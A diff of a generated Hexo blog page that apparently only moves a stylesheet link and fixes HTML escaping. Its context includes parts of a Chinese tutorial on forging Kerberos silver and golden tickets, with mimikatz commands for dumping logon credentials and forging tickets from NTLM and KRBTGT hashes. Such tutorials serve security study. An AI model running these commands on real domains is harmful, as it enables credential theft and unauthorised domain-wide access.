@@ -32,9 +32,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1">
+<meta name="generator" content="Hexo 5.4.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 
 
@@ -457,12 +457,12 @@
 <p>在构造的时候，我们可以自定义一个Server session key并使用它加密客户端的信息和时间戳并伪造一个ST一同发送给服务端。</p>
 <p><strong>白银票据-mimikatz伪造演示</strong></p>
 <p>导出Server hash：</p>
-<pre class=" language-javascript"><code class="language-javascript">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::logonpasswords"</span> <span class="token string">"exit"</span> <span class="token operator">></span> log<span class="token punctuation">.</span>txt
+<pre class=" language-javascript"><code class="language-javascript">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::logonpasswords"</span> <span class="token string">"exit"</span> <span class="token operator">&gt;</span> log<span class="token punctuation">.</span>txt
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%B8%8E%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E6%9E%84%E9%80%A0%E5%88%86%E6%9E%90/2.png"></p>
 <p><strong>伪造票据：</strong></p>
 <p>在另外的机器上执行：</p>
-<pre class=" language-javascript"><code class="language-javascript">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"kerberos::golden /domain:&lt;域名> /sid:&lt;域SID> /target:&lt;目标服务器主机名> /service:&lt;服务类型> /rc4:&lt;NTLM Hash> /user:&lt;用户名> /ptt"</span> exit
+<pre class=" language-javascript"><code class="language-javascript">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt"</span> exit
 </code></pre>
 <pre class=" language-javascript"><code class="language-javascript"><span class="token operator">/</span>domain：域名
 <span class="token operator">/</span>sid：SID值
@@ -508,7 +508,7 @@ Windows Remote Server                RPCSS、LDAP、CIFS
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%B8%8E%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E6%9E%84%E9%80%A0%E5%88%86%E6%9E%90/8.png"></p>
 <p>在另外的机器上执行：</p>
-<pre class=" language-javascript"><code class="language-javascript">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"kerberos::golden /domain:&lt;域名> /sid:&lt;域SID> /rc4:&lt;KRBTGT NTLM Hash> /user:&lt;用户名> /ptt"</span> exit
+<pre class=" language-javascript"><code class="language-javascript">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;用户名&gt; /ptt"</span> exit
 </code></pre>
 <pre class=" language-javascript"><code class="language-javascript"><span class="token operator">/</span>domain：域名
 <span class="token operator">/</span>sid：SID值
